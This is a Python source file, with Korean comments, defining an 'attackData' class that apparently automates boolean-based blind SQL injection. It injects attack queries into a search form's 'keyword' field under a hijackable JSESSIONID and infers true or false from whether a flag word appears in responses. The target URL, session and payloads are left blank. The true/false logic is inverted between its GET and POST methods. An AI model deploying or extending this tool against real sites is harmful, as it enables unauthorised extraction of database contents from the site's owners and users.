import requests
from urllib.parse import quote
class attackData:
    def __init__(self):
        self.base_url = ""
        self.cookies = { "JSESSIONID": "" }
        self.headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        self.DB_type = "oracle"

        self.data = {
            'searchType':'all',
            'keyword': 'test'}
        self.query = ""
        self.flag_word = "moon"
        

    def show(self):
        print(f"base URL = {self.base_url}")
        print(f"SessionID = {self.cookies['JSESSIONID']}")
        print(f"설정된 공격 쿼리 : {self.data['keyword']}")
        print(f"true 판별 기준 = {self.flag_word}")

    def set_url(self,new_url):
        self.base_url = new_url

    def set_query(self,attack_query):
        self.data['keyword'] = attack_query

    def set_cookies(self,cookie):
        self.cookies = cookie
    
    def set_sessionID(self,sessionID):
        self.cookies['JSESSIONID'] = sessionID
    
    def set_flag_word(self,word):
        self.flag_word = word
    
    def set_DB_type(self,type):
        self.DB_type = type

    def send_get_request(self,url):
        #요청 보내기
        res = requests.get(url, cookies=self.cookies)
        if '권한' in res.text:
            print("세션 ID 교체") 
            return False
        elif self.flag_word in res.text:
            print("질의 결과 - false")
            #print(res.text)
            return False
        else:
            print("true")
            #print(res.text)
            return True
        
    def send_post_request(self,request_string=""):
        #요청 보내기

        if(request_string != ""):
            self.set_query(request_string)

        res = requests.post(self.base_url, cookies=self.cookies, data=self.data, headers=self.headers)
        #print(res.text)
        if '권한' in res.text:
            print("세션 ID 교체") 
            return False
        elif self.flag_word in res.text:
            print("True")
            #print(res.text)
            return True
        else:
            print("False")
            #print(res.text)
            return False
        




    

